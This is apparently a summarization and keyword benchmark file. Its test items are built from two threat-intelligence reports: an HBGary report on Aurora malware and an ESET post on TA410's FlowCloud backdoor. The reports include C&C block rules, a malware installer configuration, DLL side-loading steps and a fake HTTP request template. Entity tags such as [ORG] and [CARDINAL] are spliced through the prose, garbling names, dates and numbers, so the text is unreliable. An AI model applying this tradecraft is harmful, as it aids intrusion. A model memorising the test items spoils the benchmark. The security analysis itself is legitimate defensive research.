[DATE] 01 [DATE] B4 [DATE] EE [DATE] 00 AE DA [CARDINAL] 00 8C [CARDINAL] 16 00 89 22 00 46 73 00 [CARDINAL] C6 49 00 0B AE 01 [PRODUCT] E7 [PRODUCT] 9F 04 05 81 01 0E [ORG] DF 01 79 D8 00 [CARDINAL] 25 6A 00 15 49 00 47 22 00 4B [CARDINAL] 67 [ORG] 0F [ORG] 2D [ORG] CC [DATE] 01 [DATE] 29 [DATE] 67 [DATE] 01 35 99 To thwart command and control and prevent data loss , known [ORG] C&C domains should be blocked at the egress firewall . The domains listed in the [LOC] Detect section represent a significant set of those currently known to be operating . IDS signatures similar to the one illustrated in the [LOC] Detect section should be used to detect inbound exploit attempts , and machines accepting this data should be scanned for potential infections . Many A / V products now contain signatures for the [PERSON] Aurora exploit and will be effective in detection and removal . However , the attackers that represent the threat will not be deterred , and variants of the attack are nearly assured . C&C protocolDescription If a variant is developed , it will very likely use the same [ORG] C&C protocol , but may change the header of the packet and the constants used for connection setup . This will evade [ORG] IDS [ORG] / [PERSON] Firewall rules designed to detect the current scheme . It is unlikely the attackers will change the encryption setup , however . The method used to install the service is highly effective . Although the filenames will likely change , the actual method will likely remain . Installation and DeploymentI N O C U L A T I O N S H O THBGary has prepared an inoculation shot for this malware . The inoculation shot is a small , signed binary that will allow you to scan for , and optionally remove , this malware from your Enterprise network . Remediation and Prevention with the HBGary Inoculation Shot The [ORG] AuroraInnoculation.exe is a simple [ORG] WMI - based utility for scanning windows - based machines for the presence of the [PERSON] Aurora [PERSON] APT malware package . The aurora innoculator also has the option of automatically removing a discovered infection and rebooting the box automatically . When the aurora innoculator is executed it will query the user for authentication credentials . Optionally the user can just hit \" cancel \" to use the currently logged on [ORG] USER 's authentication token . Some sample usages are listed below . To scan a single machine : To scan multiple machines : To automatically attempt a clean operation : To scan a list of machines in a .txt file : AuroraInnoculation.exe -list targets.txtV E R D A S Y S D I G I T A L G U A R D I A NDG Agents can be used to remediate and prevent further infections within the enterprise without waiting for the development of an AV signature . In this case : Remediation and Prevention with Digital Guardian A [ORG] DGUpdate package can be deployed to all agents to perform the file and registry key delete operations to inactivate and remove the malware . \u0097 \u0097Several control rules can be added to prevent the [LOC] Aurora malware infection specifically and to generically block other infection vectors : Prevent network operations on remote port [CARDINAL] 443 if the current process image was launched from [PERCENT] % [PERCENT] % APPDATA% and registry keys exist in \u201c HKLM\\Software\\Sun\\1.1.2\\IsoTp \u201d or \u201c HKLM\\Software\\Sun\\1.1.2\\AppleTlk \u201c or \u201c SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\\SysIns \u201d Prevent iexplore.exe from writing files with .exe extensions Prevent files with .exe extensions from being written , copied , moved or renamed into the root of % APPDATA% Prevent files with .exe extensions from launching in the root of % APPDATA% Prevent network operations to demo1.ftpaccess.cc Prevent executables launched from the root of [FAC] % APPDATA% from performing file open on kernel32.dll Prevent executables launched from the root of [FAC] % APPDATA% from writing , copying , moving or renaming files with a .dll extension to \u0097MORE INFORMATIONA B O U T H B G A R YHBGary , [PERSON] Inc is the leading provider of solutions to detect , diagnose and respond to advance malware threats in a thorough and forensically sound manner . We provide the active intelligence that is critical to understanding the intent of the threat , the traits associated with the malware and information that will help make your existing investment in your security infrastructure more valuable . Corporate Address : 3604 [EVENT] Fair [EVENT] Oaks [EVENT] Blvd [EVENT] Suite [CARDINAL] 250 [GPE] Sacramento , CA 95762 Phone : 916 - 459- 4727 Fax 916 - 481 - 1460 Sales@hbgary.comA B O U T V E R D A S Y [NORP] SVerdasys provides [ORG] Enterprise [ORG] Information [ORG] Protection solutions that are the foundation of our customer \u2019s global data security strategy . With [CARDINAL] greater [CARDINAL] than [CARDINAL] 2 [CARDINAL] million security agents deployed at [CARDINAL] over [CARDINAL] 150 of the world \u2019s leading organizations , [PERSON] Verdasys is the proven global leader of [ORG] Enterprise [ORG] Information [ORG] Protection and compliance solutions . Companies serious about information protection choose [GPE] Verdasys . [PERSON] Verdasys is headquartered in [GPE] Waltham , [GPE] MA . For more information , go to www.verdasys.com Phone : ( [CARDINAL] 781 ) [CARDINAL] 902 - 5685 Email : jwarren@verdasys.com i url ii url than - a - conventional - attack iii url ( via : url iv url communication - protocol/ v url exploit", "generated_text": "Operation Aurora; a remote; a Windows computer; communication; HTTP; port 443; attribution; Chinese origin; the malware; a service; 3322.org; Chinese; the C&C algorithm; Chinese origin; Hackers; use; the malware; IP addresses; attribution; several domains; Chinese origin; the Chinese Government; remote access; command; control; IP addresses; domains; Chinese speakers; a Chinese speaker; a C&C server; Chinese origin; domains; IP addresses; Coms; Chinese espionage; the operation; the Chinese government; the C&C system; Chinese language; Intent; the operations.", "ref_text": "<START-1>The report details an advanced malware operation named Aurora that was used to steal intellectual property and source code from major companies like Google and Adobe in 2009-2010. It provides extensive technical analysis of how the malware infection occurs through a JavaScript exploit in Internet Explorer 6, drops malicious files on the system, and installs a backdoor trojan payload. The backdoor communicates over HTTPS to command servers to receive commands and exfiltrate data. The malware uses multiple stages and encryption to hide its activity. File names and service names are randomized. The report covers in depth how to detect the malware through memory forensics, network monitoring, and other means. Though malware code patterns indicate Chinese origin, there is no definitive proof the Chinese government was behind the attacks. Likely it was a skilled independent hacking group. Aurora shows the capabilities of advanced malware operations even several years ago. Recommendations are made for security products to detect, analyze, and respond to infections. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.40555555555555556, "gpt3/lexical/rouge_rouge2": 0.0670391061452514, "gpt3/lexical/rouge_rougeL": 0.17777777777777778, "gpt3/lexical/rouge_rougeLsum": 0.17777777777777778, "gpt3_generated_text": ["The article discusses Operation Aurora, a malware operation that has targeted various companies for intellectual property theft. The malware used in Operation Aurora has been in development since at least 2006 and is characterized by a remotely operated backdoor program that persists on a Windows computer. While there is not significant evidence to directly attribute the operation to the Chinese government, it is highly probable that the malware was developed in the Chinese language and the operation control system is designed for Chinese users. The primary intent of the operation is the theft of intellectual property. Communication is encrypted over HTTP, port 443, and the C&C servers tend to operate from domains hosted on dynamic DNS. Attribution of the operation is challenging, but there are indications that suggest Chinese origin, such as CRC algorithm marks and attacks sourced from a service called 3322.org, owned by a Mandarin speaker named Peng Yong. However, it is important to note that Peng Yong's involvement does not necessarily mean he is directly involved with Operation Aurora. The article also provides details on how to detect Operation Aurora in an enterprise, including the components of the exploit and payload vehicle."]}, {"split_name": "test", "sample_id": "test_24", "prompt_text": "Extract the keywords: www.welivesecurity.com /2022/04/27 / lookback - ta410 - umbrella - cyberespionage - ttps - activity/ A lookback under the TA410 umbrella : Its cyberespionage TTPs and activity \u22ee [CARDINAL] 4/27/2022ESET researchers reveal a detailed profile of TA410 : we believe this cyberespionage umbrella group consists of [CARDINAL] three different teams using different toolsets , including a new version of the [PERSON] FlowCloud espionage backdoor discovered by ESET.ESET researchers reveal a detailed profile of TA410 : we believe this cyberespionage umbrella group consists of [CARDINAL] three different teams using different toolsets , including a new version of the [PERSON] FlowCloud espionage backdoor discovered by ESET.ESET researchers have documented and analyzed [PERSON] TA410 activity going back to [DATE] 2019 . [ORG] TA410 is a cyberespionage umbrella group loosely linked to APT10 , known mostly for targeting [GPE] US - based organizations in the utilities sector , and diplomatic organizations in [LOC] the [LOC] Middle [LOC] East and [LOC] Africa . [ORG] TA410 has been active since [DATE] at [DATE] least [DATE] 2018 and was [ORDINAL] first publicly revealed in [DATE] August [DATE] 2019 by [ORG] Proofpoint in its [PRODUCT] LookBack blogpost . [DATE] A [DATE] year [DATE] later , the then - new and very complex malware family called [PERSON] FlowCloud was also attributed to TA410.In this blogpost , we provide a detailed profile of this [ORG] APT group , including its modus operandi and toolset that includes a new version of [PERSON] FlowCloud , discovered by ESET . This very complex backdoor contains interesting espionage capabilities . ESET will present its latest findings about TA410 , including results from ongoing research , during Botconf [DATE] 2022 . For [ORG] YARA and [ORG] Snort rules , consult ESET \u2019s GitHub account . Key points in this blogpost : [PERSON] TA410 is an umbrella group comprised of [CARDINAL] three teams ESET researchers named [ORG] FlowingFrog , [ORG] LookingFrog and [ORG] JollyFrog , each with its own toolset and targets . ESET telemetry shows victims all around the world , mainly in the governmental and education sectors . [PERSON] TA410 had access to the most recent known [ORG] Microsoft [ORG] Exchange remote code execution vulnerabilities , e.g. , [ORG] ProxyLogon in [DATE] March [DATE] 2021 and [ORG] ProxyShell in [DATE] August [DATE] 2021 . ESET researchers found a new version of [PERSON] FlowCloud , a complex and modular [PERSON] C++ [PERSON] RAT . It has several interesting capabilities , including : Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected . Monitoring clipboard events to steal clipboard content . Monitoring file system events to collect new and modified files . Controlling attached camera devices to take pictures of the compromised computer \u2019s surroundings . FlowCloud deploys a rootkit to hide its activity on the compromised machine . The [PRODUCT] LookBack backdoor utilized by [ORG] TA410 uses a custom network protocol , which can function over HTTP or raw [ORG] TCP , for [ORG] C&C server communications . [ORG] TA410 is [CARDINAL] one of the users of [FAC] the [FAC] Royal [FAC] Road malicious document builder . TA410 teams compromise their targets in various ways , which indicates to us that those victims are targeted specifically , with the attackers choosing which entry method has the best chance of infiltrating the target . The [ORDINAL] first stage of the [PERSON] FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise , but this is n\u2019t implemented in the loaders we analyzed . However , we1/26found a custom [ORG] AntivirusCheck class , which can check running processes against a hardcoded list of executable filenames from known security products , including [ORG] ESET products . In case one of these products is detected , [PERSON] FlowCloud goes through its regular loading process and cancels the auto_start_after_install configuration value . Even though we believe that this version of [PERSON] FlowCloud is still undergoing development and testing , the cyberespionage capabilities of this version include the ability to collect mouse movements , keyboard activity , and clipboard content along with information about the current foreground window . This information can help attackers understand stolen data by contextualizing it . FlowCloud can also gather information about things happening around the victim \u2019s computer by taking pictures using connected camera peripherals and recording audio using a computer \u2019s microphone . This latter function is triggered by any sound over a threshold of [CARDINAL] 65 decibels , which is in the upper range of normal conversation volume . AttributionESET researchers believe that [PERSON] TA410 is composed of [CARDINAL] three different teams , using very similar tactics , techniques , and procedures ( TTPs ) but different toolsets and exiting from [ORG] IP addresses located in [CARDINAL] three different districts . These teams , referred to below as [ORG] FlowingFrog , [ORG] LookingFrog , and [ORG] JollyFrog , have overlaps in TTPs , victimology and network infrastructure . [ORG] FlowingFrog uses [FAC] Royal [FAC] Road RTF documents , a [ORDINAL] first - stage implant called [ORG] Tendyron , and a very complex [ORDINAL] second - stage backdoor called [PRODUCT] FlowCloud . [ORG] LookingFrog uses a [ORDINAL] first - stage backdoor called [ORG] X4 , and [PRODUCT] LookBack as a [ORDINAL] second stage . [ORG] JollyFrog uses only generic malware families such as [PERSON] Korplug ( aka PlugX ) and QuasarRAT . Part of the activity of this team was described by [PERSON] Fortinet , who attributed the activity to APT10 . ESET researchers , however , believe this activity is different from the operations that APT10 ( aka A41APT ) has conducted recently . FlowingFrog and [ORG] JollyFrog share network infrastructure \u2013 more precisely , the domain ffca.caibi379[.]com , as mentioned by [GPE] Proofpoint . [ORG] FlowingFrog and [ORG] LookingFrog ran a phishing campaign at the same time against the same targets , as also mentioned in the same [GPE] Proofpoint article . In ESET telemetry , we do not see any other overlap between these subgroups . We believe that these subgroups operate somewhat independently but that they may share intelligence requirements , an access team that runs their spearphishing campaigns , and also the team that deploys network infrastructure . VictimologyMost TA410 targets are high - profile organizations in the diplomacy and education sectors , but we have also seen victims in the military sector , a manufacturing company in [GPE] Japan , a mining company in [GPE] India , and a charity in [GPE] Israel . According to ESET telemetry , the victims are located in [LOC] Africa , [LOC] Asia , [LOC] the [LOC] Middle [LOC] East , and [LOC] Europe . Interestingly , there is no clear segmentation of the targeting ( by sector or geography ) among the different teams . An element worth mentioning is that TA410 targets foreign individuals in [GPE] China . In ESET telemetry , we have observed this as having happened at least twice : for instance , [CARDINAL] one victim is a [NORP] French academic , and another is a member of a diplomatic mission of a [NORP] South [NORP] Asian country in [GPE] China . Since [DATE] 2018 , we have seen the following targets , also depicted in Figure [CARDINAL] 1 : FlowingFrog : University , foreign diplomatic mission of a [NORP] South [NORP] Asian country in [GPE] China , mining company [ORG] LookingFrog : Diplomatic missions , charity , government and industrial manufacturing [ORG] JollyFrog : Education , church , military , diplomatic mission2/26Figure 1 . Map of countries and verticals targeted by [PRODUCT] TA410 [PRODUCT] Initial compromise and typical TTPsIf we exclude the different backdoors , the [CARDINAL] three teams use a similar modus operandi . They compromise their targets either by spearphishing , according to [GPE] Proofpoint , or , for [ORG] LookingFrog and [ORG] JollyFrog , by compromising a web - facing application such as [ORG] Microsoft [ORG] Exchange or [ORG] SharePoint . This could indicate that victims are targeted specifically , with the attackers choosing which entry method is the best for a given target . The public - facing application compromise approach is what we have seen the most . Attackers linked to [ORG] LookingFrog exploited [ORG] Microsoft [ORG] SharePoint servers in [DATE] 2019 to gain code execution , probably by leveraging CVE-2019 - 0604 . They then dropped an ASPX webshell that was used to install other malicious components . These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe , a known LOLBin . In [DATE] 2020 , we saw further exploitations by [ORG] JollyFrog , of [ORG] Microsoft [ORG] SQL servers and IIS servers running custom applications . In [DATE] August [DATE] 2021 , we observed [PRODUCT] LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in [GPE] Japan . This happened following the exploitation of the Exchange ProxyShell vulnerability on that server , as we describe in ESET Threat Report T3 2021.This shows that [ORG] LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use of any available exploit in order to gain control of unpatched servers run by organizations on their target lists . In addition to the full - featured backdoors analyzed in the following sections , these attackers use a variety of tools such as vulnerability scanners , exploits from [ORG] the [ORG] Equation [ORG] Group leaks , proxy / tunneling utilities ( [ORG] HTran , [ORG] LCX , [PERSON] EarthWorm ) , and lateral movement scripts such as WMIExec . Arsenal TA410 \u2013 FlowingFrogFlowingFrog uses a [ORDINAL] first stage that ESET researchers have named the [ORG] Tendyron downloader , and a complex [ORDINAL] second stage named [PERSON] FlowCloud , so named by the developers in its modules \u2019 PDB paths . [ORG] Royal [ORG] Road and Tendyron downloaderRoyal Road is a malicious document builder used by several cyberespionage groups ( see the analysis by nao_sec ) . [PERSON] Files built with this tool are RTF documents exploiting [ORG] Equation Editor [DATE] N - day vulnerabilities such as CVE-2017 - 11882 . TA410 operators always use [ORG] the [ORG] Royal [ORG] Road encoding bytes : [PRODUCT] A9 [PRODUCT] A4 [PRODUCT] 6E [PRODUCT] FE , as seen in Figure [DATE] 2.3/26Figure [DATE] 2 . Encoded [FAC] Royal [FAC] Road payloadOn [DATE] October [DATE] 13th [DATE] 2020 , we noticed that a new [FAC] Royal [FAC] Road RTF document , shown in Figure [CARDINAL] 3 , had been uploaded to [ORG] VirusTotal . Figure [CARDINAL] 3 . Royal Road RTF document found on [ORG] VirusTotal ( [PERSON] SHA\u20111 : ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20)When opened , the document triggers the injection of a custom downloader \u2013 a [ORG] PE executable \u2013 into an iexplore.exe process . The [ORG] PE resources [CARDINAL] 103 , [CARDINAL] 104 and [CARDINAL] 105 contain the payload URLs , [ORG] XORed with [DATE] 0xD3 . The following files are downloaded and written to disk : url written to % localappdata%\\Tendyron\\Tendyron.exe ( SHA-1 : 09C76522136B5E9BAB74381FEEE265F7E9B1D550 ) url written to % localappdata%\\Tendyron\\OnKeyToken_KEB.dll ( [PERSON] SHA\u20111 : F359D3C074135BBCA9A4C98A6B6544690EDAE93D ) url written to % [GPE] localappdata%\\Tendyron\\Tendyron.conf ( we were not able to retrieve this [ORG] file)Finally , this process separately downloads url ( resource 101 ) , loads it into memory , and calls its startModule export . Unfortunately , we were not able to retrieve this sample.Tendyron.exe is a legitimate executable , signed by online - banking security vendor [ORG] Tendyron [ORG] Corporation , and that is vulnerable to [ORG] DLL search - order hijacking . Persistence for the downloaded payload is established via the Tendyron4/26value under the Run key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run . When executed , [GPE] Tendyron.exe loads the malicious OnKeyToken_KEB.dll . The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode ( see Figure [CARDINAL] 4 ) and injects it into iexplore.exe using [FAC] WriteProcessMemory . Figure [CARDINAL] 4 . Shellcode decryption loopThe next stage , injected into iexplore.exe , is a backdoor written using [ORG] the [ORG] Microsoft [ORG] Foundation Class ( MFC ) framework . It also contains [PRODUCT] RTTI symbols and thus a few [LANGUAGE] C++ class names : [ORG] ClientSocket KernelManagerThese class names are the same as used in [ORG] Farfli / Gh0stRAT , a backdoor that has been used for [DATE] more [DATE] than [DATE] 10 [DATE] years to conduct ( mostly ) cyberespionage operations . Its source code was leaked and is now available on [ORG] GitHub . Thus , we believe that TA410 developers reused code copied from [ORG] Farfli . The [ORG] C&C server is hardcoded , in cleartext , in the sample ; in this specific case , it is set to 114.118.83[.]141.On [ORG] VirusTotal , as shown in Figure [CARDINAL] 5 , we can see [CARDINAL] one more HTTP request to [CARDINAL] 103.139.2[.]93 was triggered during the execution of the [ORG] RTF file . The result of the request to url was recorded by [ORG] VirusTotal and the SHA-1 of this encrypted file is [DATE] 140F81037A76B7B16A00E1D5E0E2CD9F6687F642 . This [ORG] URI is typical of those used to download [PERSON] FlowCloud , a complex [NORP] C++ implant described in the next section . Figure [CARDINAL] 5 . URL requests seen by the [ORG] VirusTotal sandbox during execution of the malicious [ORG] RTF documentThe identical encrypted file was also downloaded from url by a FlowCloud dropper version 4.1.3 ( [PERSON] SHA\u20111 : 014421BDB1EA105A6DF0C27FC114819FF3637704 ) . A summary of the compromise chain is provided in Figure 6.5/26Figure [CARDINAL] 6 . Compromise chain from [LOC] the [LOC] Royal [LOC] Road document to FlowCloudFlowCloudFlowCloud is a complex implant written in [LANGUAGE] C++ . It consists of [CARDINAL] three main components , deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis . Multiple versions of [PERSON] FlowCloud have been identified since [DATE] 2020 , most notably versions 4.1.3 and [CARDINAL] 5.0.1 described by [GPE] Proofpoint . In this section , we analyze [PERSON] FlowCloud versions [DATE] 5.0.2 and [DATE] 5.0.3 . Contrary to those previously found , the samples we obtained for version [CARDINAL] 5.0.2 contain verbose error messages and meticulous logging . This deployment process is very similar to the [CARDINAL] one described by [GPE] Proofpoint for version [CARDINAL] 5.0.1 . The [CARDINAL] three main components are a driver with rootkit functionality , a simple persistence module , and a custom backdoor . We describe these in detail in the upcoming sections . Loader ( ClientLdrExe)The [ORDINAL] first stage is responsible mostly for creating the files and registry keys used by the other stages . The values for these executables and configuration data can be found , encrypted , in the loader \u2019s resource section . Table 1 contains an overview of these resources and their use . Table 1 . Contents of the dropper \u2019s resourcesResource ID 102FlowCloud RAT DLL 32 - bit rootkit driver [CARDINAL] 64 - bit rootkit driverRoleInternal namefcClientDll Driver Driver6/26Resource ID 10000RoleInternal nameN / A [ORG] DLL hijacking vulnerable app SETLANG_dlcore [PERSON] Shellcode loaded by the malicious library in the [ORG] DLL hijacking [ORG] N / [ORG] A [ORG] Shellcode that loads [ORG] fcClient ( unused ) fcClient Final dropper stage fcClientWD_x86 32 - bit persistence module fcClientWD_x64 [CARDINAL] 64 - bit persistence module slam [ORG] Legitimate library used for module stomping XXXModule_dlcore0 DLL used for hijacking N / A [ORG] Protobuf serialized [PERSON] FlowCloud configuration Used as an alternative or extension to resource [DATE] 2001 N / A Path to the registry key for the PrintProcessor service ( used by the driver ) N / A N / A Installation configurationIn the instances we observed , most resources are written to disk encrypted , and only decrypted in memory when needed . In some cases , they are then re - encrypted but with a different key . This technique makes it harder to dump the plaintext values from the process \u2019s memory and to analyze exit dumps . The paths and registry keys to use , and whether they should be decrypted before being written , are defined in the installation configuration . The samples we analyzed all store their files in the % ProgramFiles%\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\ directory ; we believe that this is the default value . [PERSON] FlowCloud uses filenames that are either similar to those of legitimate [PRODUCT] Windows files ( e.g. , rebare.dll which could be mistaken for [DATE] rebar.dll ) or innocuous looking ( e.g. , [ORG] AC146142 ) to avoid suspicion . Figure [CARDINAL] 7 presents a graphical overview of the deployment process and its elements . We explain each of the steps in further detail in the upcoming sections.7/26Figure [CARDINAL] 7 . FlowCloud deployment processFirst , the loader decrypts and parses the embedded installation configuration , which uses the [PRODUCT] Windows [PRODUCT] INI format . This configuration defines the malware \u2019s install path along with the filename or registry key where each embedded resource is to be written . The same values are hardcoded in the following stages , which leads us to think that the samples are generated using a builder . In a sample we analyzed , this configuration is accompanied with comments explaining the values for some sections . Figure [CARDINAL] 8 shows this installation configuration with the comments translated to English.123456789#Product name , these will be used in the configuration generator and applied to the front end[product]product_chs_name = [WORK_OF_ART] Sky Arrowproduct_name = PCArrowIproduct_version = v5.0.2[general]created_folder=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msoleinstall_folder=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole8/2610data_folder=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\fcdata1112hide_user_activity_tab = 01314#File path , not including drive letter15[file]16100=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\responsor.dat17103=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\setlang.exe18104=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\setlangloc.dat19#105=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\rebare.dat20106=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\rescure.dat21107=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\rescure86.dat22108=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\rescure64.dat23109=:\\Program [CARDINAL] Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\sspisrvui.dat24110=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\setlangloc.dll25101=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\E86F36C426102=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\AC146142271000=:\\Program Files\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\E19D9D4B2829#0x0001 Release without decryption30#0x0002 Decryption release31[file_out_type]32100=0x000133103=0x000234104=0x000235#105=0x000236106=0x000237107=0x000238108=0x000239109=0x000240110=0x000241101=0x000142102=0x0001431000=0x000144##Registry path : separated by'| ' , respectively representing [ORG] HKEY_LOCAL_MACHINE , path name , value name[key]##100=0x80000002|SYSTEM\\Setup\\PrintResponsor|1#101=0x80000002|SYSTEM\\Setup\\PrintResponsor|2#102=0x80000002|SYSTEM\\Setup\\PrintResponsor|3#1000=0x80000002|SYSTEM\\Setup\\PrintResponsor|4##2000=0x80000002|SYSTEM\\Setup\\AllowStart\\ceipCommon|1##2001=0x80000002|SYSTEM\\Setup\\AllowStart\\ceipCommon|22001=0x80000002|SYSTEM\\Setup\\AllowStart\\ceipCommon|1454647484950515253549/265556##0x0001 Release without decryption57##0x0002 [ORG] Decryption [ORG] release58[key_out_type]59##100=0x000160#101=0x000161#102=0x000162#1000=0x000163#2000=0x0002642001=0x00026566#Service [ORG] Information : hhw.exe needs to be dynamically generated67[service_attribute]68is_hhw=069service_name = PrintResponsor70service_path=%ProgramFiles%\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\setlang.exeservice_parm = Figure [CARDINAL] 8 . Installation configuration with explanatory comments . Note that some fields are commented out . The configuration can also contain a section defining specific security software to check for , but this is n\u2019t implemented in the loaders we analyzed . However , there is a custom AntivirusCheck class , which can check running processes against a hardcoded list of XOR - encrypted executable filenames from known security products : [ORG] 360 [ORG] Total [ORG] Security , Avast , Avira , [ORG] AVG , Bitdefender , [ORG] ESET , [ORG] Jiangmin [ORG] Technology [ORG] Antivirus , [GPE] Kingsoft , [GPE] McAfee , [ORG] Micropoint , [ORG] Norton , [WORK_OF_ART] Rising [WORK_OF_ART] Antivirus , and [ORG] Trend [ORG] Micro . This class is only used if the loader is set to directly start the [ORG] fcClient module via the auto_start_after_install configuration key . Depending on the configuration keys used , the loader can either load the fcClientDll [ORG] RAT module directly , thus bypassing most of the complex deployment process , or it can create a service or scheduled task . In the former case , the task or service attains persistence by being set to start automatically on boot . In the samples we observed , the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to [ORG] DLL search - order hijacking . The application and the accompanying relevant and malicious [ORG] DLL were both embedded in the loader \u2019s resources . [ORG] DLL side - loading ( XXXModule_dlcore0)In the samples we analyzed , the vulnerable application was either setlang.exe from [ORG] Microsoft [ORG] Office [DATE] 2003 with a malicious [ORG] setlangloc.dll or vpreview.exe from [PERSON] Visio [PERSON] Preview 2007 with a malicious vviewres.dll . Strings contained in the malicious [ORG] DLL also point to emedres.dll from Emurasoft \u2019s [ORG] EmEditor as a possible [ORDINAL] third target for [ORG] DLL side - loading . This is a real possibility as such vulnerabilities were present in older versions of EmEditor , but we did not see any samples using it . In all observed samples , the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the [ORG] DLL , but with a .dat extension . We analyze this shellcode in the next section , but [ORDINAL] first , we want to look at the notable anti - analysis techniques used in this library . Despite its relatively simple goals , the library \u2019s code makes heavy use of anti - debugging tricks and control flow obfuscation to hinder analysis . In the function that loads the next file , the useful code is repeatedly interspersed with the same sequence of opcodes to obfuscate the program \u2019s flow . As shown in Figure [CARDINAL] 9 , this short snippet is packed full of anti - analysis tricks , but ultimately amounts to an unconditional [QUANTITY] 16 - byte jump . This is enough to foil many automatic analyses , including decompilers.10/26Figure [CARDINAL] 9 . Annotated disassembly of the control flow obfuscation snippetThe above snippet is bookended by calls to [CARDINAL] two anti - debugging functions , as can be seen in Figure [CARDINAL] 10 . The function , which we named crash_if_debugger in the previous screenshot , calls IsDebuggerPresent and checks some commonly hooked library functions for a breakpoint as their [ORDINAL] first instruction . If those checks detect a debugger , the function returns a value that will cause the program to jump to an invalid address and crash . The [ORDINAL] second one raises an exception via the [ORG] INT 0x2D instruction and exits if it was handled by a debugger . Figure [CARDINAL] 10 . [PERSON] Decompiler view showing the obvious pattern of anti - debugging checks . Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.fcClient ( rescure.dat)When it is [ORDINAL] first executed , this module sets up persistence and installs the backdoor , rootkit , and persistence modules . It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs . [ORDINAL] First , persistence is established by using the ITaskService COM interface to create the \\Microsoft\\Windows\\CertificateServicesClient\\NetTask scheduled task . If a task with the same name already exists , it is deleted before the new one is created . This task will run the [ORG] DLL hijacking target as SYSTEM at each boot . Afterwards , the rootkit module is decrypted and written to the % System%\\drivers folder as hidmouse.sys . A hidmouse service is then created to run that module and is immediately started . The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder . Thus , anyone looking at the file on disk rather than the [CARDINAL] one mapped into memory would see a legitimate , benign file . On Windows [CARDINAL] 10 machines , the system time is briefly changed to make it look like the service was created in [DATE] January [DATE] 2013 . Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers . The following files are copied to the % System% directory : The backdoor : rescure.dat A decoy [ORG] DLL : sspisrvui.dat as sspisrvui.dll ( timestomped to [DATE] July [DATE] 2013 ) The encrypted shellcode : rebare.datThe rebare.dat shellcode is very similar to that used in the self - decrypting [ORG] DLL , but it loads [ORG] fcClient directly . [PERSON] FlowCloud then starts a suspended process to perform injection on it . This process is created via [ORG] CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session . The injected code loads the same backdoor ( rescure.dat ) into the process \u2019s memory and calls its startModule export to finish the installation . Meanwhile , the injection process is [GPE] terminated.11/26At this point , installation of the backdoor is complete . All that is left is to execute the backdoor . To achieve this , the new process loads the decoy [ORG] DLL and manually replaces its content in memory with the fcClientDll module ( a process known as module stomping or [ORG] DLL hollowing ) , before calling its main function.fcClientDll ( responsor.dat)This complex module is the main component of the backdoor . It provides a wide range of capabilities from full file system access to control of camera peripherals and everything in between . Although we did not observe any plug - ins , the backdoor contains code that hints that they can be used to further extend functionality . Before diving deeper into the functionalities , we want to highlight some notable characteristics : Configuration information and data for communications with the [ORG] C&C server are [ORG] Protobuf - serialized , compressed , and encrypted . File exfiltration is done through encrypted , [ORG] Protobuf - serialized structures and is disguised as HTTP by prepending the data with a hardcoded , fake [ORG] POST request . The Content - Length header is the only variable element , as it is set to the actual size of the data sent . This hardcoded request can be seen in Figure [CARDINAL] 11 . Chrome/49.0.2623.87 Safari/537.36Content - Type : application / x - amfAccept : * /*Referer : url gzip , deflateAccept - Language : zh - CN , zh;q=0.8Cookie : COOKIE_SUPPORT = true ; JSESSIONID=5C7E7A60D01D2891F40648DAB6CB3DF4.jvm1 ; [ORG] COMPANY_ID=10301 ; ID=666e7375545678695645673d ; PASSWORD=7a4b48574d746470447a303d ; LOGIN=6863303130 ; SCREEN_NAME=4a2b455377766b657451493d ; GUEST_LANGUAGE_ID = en - USFigure 11 . Hardcoded , fake [ORG] HTTP [ORG] POST request used for FlowCloud [ORG] C&C communicationThis component uses an encrypted , [ORG] Protobuf - serialized configuration that it tries to read from a file on disk or a registry key . The configurations we observed were composed of [CARDINAL] three sections:1 . server_config : This section contains information about the [ORG] C&C servers and identification information about thevictim and backdoor.2 . policys [ sic ] : This section defines the behavior of the backdoor \u2019s components and is described in detail in thefollowing paragraphs.3 . install_config : As the name indicates , this section defines the installation parameters . An example of such a server_config is shown in Figure [CARDINAL] 12 . This configuration corresponds to resource [CARDINAL] 1000 in the initial loader . It defines the address and port for both the exfiltration server ( file_server ) and the [ORG] C&C server ( exchange_server ) , along with the encryption key to use for communication with each . A fallback server can also be defined for each of these . The file_key field defines the encryption key to use when storing files that are to be exfiltrated . The other entries are used to identify the backdoor and the victimized host : product_name : A name for the 